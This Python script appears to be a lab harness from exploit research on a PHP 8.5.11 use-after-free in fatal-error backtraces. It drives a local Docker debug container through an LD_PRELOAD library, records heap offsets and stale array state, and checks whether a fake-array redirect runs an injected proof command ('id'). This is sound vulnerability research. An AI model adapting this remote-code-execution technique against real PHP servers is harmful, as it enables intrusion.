#!/usr/bin/env python3
"""Phase 0/1 driver for the PHP 8.5 fatal-backtrace instrumentation.

Lab-only. Starts the amd64 debug image, drives one producer and one consumer,
and records the stale zval / zend_array state before the consumer dtor.

The debug images are committed amd64 images because this Docker install has no
buildx and the legacy builder ignores --platform. See docker/Dockerfile.85-debug
for the intended recipe and references/8.5-rce-instrumentation.md for the
container+commit build command actually used.
"""
from __future__ import annotations

import argparse
import json
import re
import subprocess
import sys
import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path

PROJECT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(PROJECT / "src"))
from php2shell_check import wire  # noqa: E402

VULN85 = "php2shell:8.5.11-debug"
FIXED85 = "php2shell:8.5.12-debug"
PRELOAD_DIR = PROJECT / "out" / "test85" / "preload"


def sh(args: list[str], check: bool = True) -> subprocess.CompletedProcess:
    result = subprocess.run(args, capture_output=True, text=True)
    if check and result.returncode != 0:
        raise RuntimeError("%s failed: %s" % (" ".join(args[:3]),
                                              (result.stderr or result.stdout).strip()))
    return result


def free_port() -> int:
    import socket
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


@dataclass
class DebugLab:
    image: str
    run_dir: Path
    fatal: int = 1
    mode: str = "log"
    command: str = "id > /out/rce85-instrumented-proof"
    watch: str | None = None
    name: str = field(default_factory=lambda: "p2s85-dbg-" + uuid.uuid4().hex[:8])
    port: int = field(default_factory=free_port)

    @property
    def out_dir(self) -> Path:
        return self.run_dir / "out"

    def start(self) -> None:
        self.out_dir.mkdir(parents=True, exist_ok=True)
        # Per-run INI: parallel suites must not share this file.
        ini = self.run_dir / "zz-backtrace.ini"
        ini.write_text(
            "fatal_error_backtraces = %d\nzend.exception_ignore_args = 0\n" % self.fatal
        )
        sh(["docker", "rm", "-f", self.name], check=False)
        args = [
            "docker", "run", "-d", "--name", self.name,
            "--platform", "linux/amd64",
            "--cap-add=SYS_PTRACE", "--security-opt", "seccomp=unconfined",
            "--memory", "1g", "--memory-swap", "1g", "--cpus", "2",
            "--security-opt", "no-new-privileges:true",
            "-e", "LD_PRELOAD=/preload/p2s85-preload.so",
            "-e", "P2S85_PRELOAD_LOG=/out/p2s85-preload.log",
            "-e", "P2S85_EG_FIELD_OFF=0x1b0",
            "-e", "P2S85_PRELOAD_MODE=%s" % self.mode,
            "-e", "P2S85_CMD=%s" % self.command,
            *(["-e", "P2S85_WATCH=%s" % self.watch] if self.watch else []),
            "-p", "127.0.0.1:%d:80" % self.port,
            "-v", "%s:/var/www/html:ro" % (PROJECT / "docker" / "www"),
            "-v", "%s:/etc/apache2/conf-enabled/zz-p2s.conf:ro"
                  % (PROJECT / "docker" / "apache-single.conf"),
            "-v", "%s:/usr/local/etc/php/conf.d/zz-lab.ini:ro"
                  % (PROJECT / "docker" / "php-lab.ini"),
            "-v", "%s:/usr/local/etc/php/conf.d/zz-backtrace.ini:ro" % ini,
            "-v", "%s:/preload:ro" % PRELOAD_DIR,
            "-v", "%s:/out" % self.out_dir,
            self.image,
            "/bin/sh", "-c",
            "cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini; "
            "chown -R www-data:www-data /out; exec apache2-foreground",
        ]
        sh(args)
        deadline = time.monotonic() + 120
        while time.monotonic() < deadline:
            try:
                if wire.get("127.0.0.1", self.port, "/index.php", timeout=5).status == 200:
                    return
            except OSError:
                pass
            time.sleep(0.3)
        raise RuntimeError("debug target did not become ready")

    def get(self, path: str, timeout: float = 60):
        return wire.get("127.0.0.1", self.port, path, timeout=timeout)

    def worker_pids(self) -> list[int]:
        result = sh(["docker", "exec", self.name, "ps", "-eo", "pid=,ppid=,cmd="],
                    check=False)
        pids = []
        for line in result.stdout.splitlines():
            fields = line.split(None, 2)
            if len(fields) >= 3 and "apache2" in fields[2] and fields[1] != "0":
                try:
                    pids.append(int(fields[0]))
                except ValueError:
                    pass
        return pids

    def stop(self) -> None:
        sh(["docker", "rm", "-f", self.name], check=False)


def parse_extension_log(path: Path) -> dict:
    """Last producer-side (RSHUTDOWN) array record plus its frame."""
    text = path.read_text(errors="replace") if path.exists() else ""
    records = []
    current = None
    for line in text.splitlines():
        m = re.match(r"rshutdown ht=(0x[0-9a-f]+) chunk=(0x[0-9a-f]+) off=(?:0x)?([0-9a-f]+) "
                     r"refc=(\d+) .*arData=(0x[0-9a-f]+) nUsed=(\d+) nElems=(\d+) "
                     r"nSize=(\d+) .*pDtor=(0x[0-9a-f]+)", line)
        if m:
            current = {
                "ht": int(m.group(1), 16),
                "chunk": int(m.group(2), 16),
                "offset": int(m.group(3), 16),
                "refcount": int(m.group(4)),
                "ardata": int(m.group(5), 16),
                "nused": int(m.group(6)),
                "nelems": int(m.group(7)),
                "ntable": int(m.group(8)),
                "pdestructor": int(m.group(9), 16),
                "frame": None,
                "frame_offset": None,
                "args_offset": None,
                "header": None,
            }
            records.append(current)
        if (current is not None and current.get("header") is None
                and line.startswith("rshutdown  +")):
            current.setdefault("_hex", []).extend(
                int(x, 16) for x in line.split(":", 1)[1].split())
            if len(current["_hex"]) >= 64:
                current["header"] = bytes(current.pop("_hex")[:64])
        m = re.match(r".*frame\[0\] ht=(0x[0-9a-f]+) off=(?:0x)?([0-9a-f]+)", line)
        if m and current is not None:
            current["frame"] = int(m.group(1), 16)
            current["frame_offset"] = int(m.group(2), 16)
        m = re.match(r"\s+args ht=(0x[0-9a-f]+) off=(?:0x)?([0-9a-f]+)", line)
        if m and current is not None:
            current["args_offset"] = int(m.group(2), 16)
    return records[-1] if records else {}


def parse_preload_log(path: Path) -> dict:
    """Last consumer-side dtor record for EG(last_fatal_error_backtrace)."""
    text = path.read_text(errors="replace") if path.exists() else ""
    records = []
    current = None
    for line in text.splitlines():
        m = re.match(r"== DTOR eg_field pid=(\d+) p=(0x[0-9a-f]+) value=(\(nil\)|0x[0-9a-f]+) "
                     r"type=(\d+) mode=(\w+)", line)
        if m:
            current = {
                "pid": int(m.group(1)),
                "field": int(m.group(2), 16),
                "value": 0 if m.group(3) == "(nil)" else int(m.group(3), 16),
                "type": int(m.group(4)),
                "mode": m.group(5),
                "ht_offset": None,
                "header": None,
                "redirect": None,
            }
            records.append(current)
            continue
        m = re.match(r"   ht=0x[0-9a-f]+ chunk=(0x[0-9a-f]+) off=(?:0x)?([0-9a-f]+)", line)
        if m and current is not None:
            current["chunk"] = int(m.group(1), 16)
            current["ht_offset"] = int(m.group(2), 16)
        if (current is not None and current.get("header") is None
                and line.startswith("ht  +")):
            current.setdefault("_hex", []).extend(
                int(x, 16) for x in line.split(":", 1)[1].split())
            if len(current["_hex"]) >= 64:
                current["header"] = bytes(current.pop("_hex")[:64])
        m = re.match(r"   redirected stale zval to fake array (0x[0-9a-f]+)", line)
        if m and current is not None:
            current["redirect"] = int(m.group(1), 16)
    typed = [r for r in records if r["type"] == 7]
    return typed[-1] if typed else (records[-1] if records else {})


def one_run(args, image: str, label: str, index: int) -> dict:
    run_dir = Path(args.evidence).resolve() / ("%s-%02d" % (label, index))
    if run_dir.exists():
        import shutil
        shutil.rmtree(run_dir)
    lab = DebugLab(image=image, run_dir=run_dir, fatal=args.fatal,
                   mode=args.mode, command=args.command, watch=args.watch)
    record = {"image": image, "label": label, "run": index, "fatal": args.fatal,
              "mode": args.mode, "evidence": str(run_dir)}
    try:
        lab.start()
        record["workers_before"] = lab.worker_pids()
        (run_dir / "health.resp").write_bytes(
            wire.get("127.0.0.1", lab.port, "/index.php", timeout=30).raw)
        producer = lab.get("/fatal.php?mode=user_error")
        (run_dir / "fatal.resp").write_bytes(producer.raw)
        record["producer_status"] = producer.status
        time.sleep(0.5)
        record["producer"] = parse_extension_log(lab.out_dir / "p2s85-probe.log")
        consumer = lab.get("/consumer/index.php")
        (run_dir / "consumer.resp").write_bytes(consumer.raw)
        record["consumer_status"] = consumer.status
        time.sleep(0.75)
        record["consumer"] = parse_preload_log(lab.out_dir / "p2s85-preload.log")
        proof = lab.out_dir / "rce85-instrumented-proof"
        record["proof"] = proof.read_text().strip() if proof.exists() else None
        record["workers_after"] = lab.worker_pids()
        record["healthy"] = False
        try:
            record["healthy"] = wire.get("127.0.0.1", lab.port, "/index.php",
                                         timeout=5).status == 200
        except OSError:
            pass
        tail = sh(["docker", "logs", "--tail", "30", lab.name], check=False)
        record["apache_tail"] = ((tail.stdout or "") + (tail.stderr or ""))[-6000:]
        preload_text = (lab.out_dir / "p2s85-preload.log").read_text(errors="replace") \
            if (lab.out_dir / "p2s85-preload.log").exists() else ""
        record["alloc_events"] = [ln for ln in preload_text.splitlines()
                                  if ln.startswith("== ALLOC_") or ln.startswith("== FREE_")]
        record["worker_replaced"] = bool(record["workers_before"])
        record["worker_replaced"] = (record["workers_before"] != record["workers_after"])
        record["crash_marker"] = any(m in record["apache_tail"] for m in
                                     ("exit signal", "zend_mm_heap corrupted", "SIGSEGV"))
    finally:
        if not args.keep:
            lab.stop()
        else:
            record["container"] = lab.name
    (run_dir / "run.json").write_text(json.dumps(record, indent=2, default=str) + "\n")
    return record


def summarize(records: list[dict]) -> dict:
    offsets = [r.get("producer", {}).get("offset") for r in records]
    frame_offsets = [r.get("producer", {}).get("frame_offset") for r in records]
    args_offsets = [r.get("producer", {}).get("args_offset") for r in records]
    intact = []
    for r in records:
        p, c = r.get("producer", {}), r.get("consumer", {})
        if c.get("type") != 7:
            intact.append(None)
            continue
        intact.append(bool(p.get("header") and c.get("header")
                           and p["header"][:0x30] == c["header"][:0x30]))
    return {
        "runs": len(records),
        "top_level_offsets": [hex(o) if o is not None else None for o in offsets],
        "frame_offsets": [hex(o) if o is not None else None for o in frame_offsets],
        "args_offsets": [hex(o) if o is not None else None for o in args_offsets],
        "stable_top_level": len(set(offsets)) == 1 and offsets[0] is not None,
        "stable_frame": len(set(frame_offsets)) == 1 and frame_offsets[0] is not None,
        "header_intact_before_dtor": intact,
        "consumer_types": [r.get("consumer", {}).get("type") for r in records],
        "proofs": [r.get("proof") for r in records],
        "healthy_after": [r.get("healthy") for r in records],
        "worker_replaced": [r.get("worker_replaced") for r in records],
        "crash_marker": [r.get("crash_marker") for r in records],
        "alloc_events": [r.get("alloc_events", []) for r in records],
    }


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--image", default=VULN85)
    parser.add_argument("--mode", choices=("log", "clear", "fake"), default="log")
    parser.add_argument("--fatal", type=int, choices=(0, 1), default=1)
    parser.add_argument("--runs", type=int, default=3)
    parser.add_argument("--label", default=None)
    parser.add_argument("--evidence", default=str(PROJECT / "out" / "test85" / "phase0"))
    parser.add_argument("--keep", action="store_true")
    parser.add_argument("--command", default="id > /out/rce85-instrumented-proof")
    parser.add_argument("--watch", default=None, help="stale 56-byte slot address for alloc tracing")
    args = parser.parse_args()

    label = args.label or ("%s-%s-fatal%d" % (
        ("vuln" if "8.5.11" in args.image else "fixed"), args.mode, args.fatal))
    records = [one_run(args, args.image, label, i + 1) for i in range(args.runs)]
    summary = summarize(records)
    root = Path(args.evidence).resolve()
    root.mkdir(parents=True, exist_ok=True)
    (root / (label + ".json")).write_text(
        json.dumps({"summary": summary, "runs": records}, indent=2, default=str) + "\n")
    print(json.dumps(summary, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
